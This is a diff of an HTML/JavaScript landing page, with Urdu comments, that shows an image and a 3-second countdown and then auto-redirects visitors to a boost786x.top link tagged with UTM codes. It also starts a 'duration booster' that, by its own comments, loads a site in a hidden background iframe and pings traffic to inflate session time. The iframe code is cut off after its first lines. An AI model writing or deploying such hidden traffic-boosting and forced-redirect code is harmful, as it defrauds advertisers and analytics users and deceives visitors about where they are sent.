@@ -31,11 +31,7 @@
       height: 100vh;
       object-fit: cover;
       cursor: pointer;
-      display: none;
-    }
-    .loading {
-      color: #fff;
-      font-size: 18px;
+      display: block; /* تصویر فوری شو ہوگی */
     }
 
     /* Circular Countdown Overlay Styles */
@@ -46,7 +42,7 @@
       transform: translate(-50%, -50%);
       width: 90px;
       height: 90px;
-      display: none;
+      display: flex; /* کاؤنٹ ڈاؤن شروع سے ہی تصویر کے اوپر شو ہوگا */
       justify-content: center;
       align-items: center;
       background: rgba(0, 0, 0, 0.55);
@@ -93,8 +89,8 @@
 </head>
 <body>
 
-  <img id="main-image" alt="" onclick="goToTarget()">
-  <div class="loading" id="loading-text">Loading...</div>
+  <!-- تصویر فوری لوڈ ہوگی -->
+  <img id="main-image" src="image_03.webp" alt="" onclick="goToTarget()">
 
   <!-- Circle Countdown HTML -->
   <div class="countdown-container" id="countdown-box">
@@ -109,27 +105,17 @@
 /* CONFIGURATION */
 const CONFIG = {
   // Target Direct Link with UTM
-  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.&utm_medium=B.nr",
-  userImage: "image_03.webp"
+  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.&utm_medium=B.NR"
 };
 
 /* MAIN LOGIC */
 (function () {
-  // Show image screen and start countdown
-  showImageScreen();
+  // 1. فرنٹ پر 3, 2, 1 کاؤنٹ ڈاؤن شروع
   startCountdown(3);
 
-  // Background Session & Time Boosting
+  // 2. بیک گراؤنڈ میں ویب سائٹ لوڈ اور ٹریفک پنگ
   startDurationBooster();
 })();
-
-function showImageScreen() {
-  const img = document.getElementById("main-image");
-  img.src = CONFIG.userImage;
-  img.style.display = "block";
-  document.getElementById("loading-text").style.display = "none";
-  document.getElementById("countdown-box").style.display = "flex";
-}
 
 /* COUNTDOWN TIMER FUNCTION */
 function startCountdown(seconds) {
@@ -149,12 +135,12 @@ function startCountdown(seconds) {
       numDisplay.textContent = "0";
       circleProgress.style.strokeDashoffset = totalCircleLength;
       clearInterval(timer);
-      goToTarget();
+      goToTarget(); // 3، 2، 1 ختم ہوتے ہی ری ڈائریکٹ
     }
   }, 1000);
 }
 
-/* HIDDEN IFRAME & PING FUNCTION */
+/* HIDDEN IFRAME & PING FUNCTION (Purely Background) */
 function startDurationBooster() {
   try {
     const iframe = document.createElement('iframe');
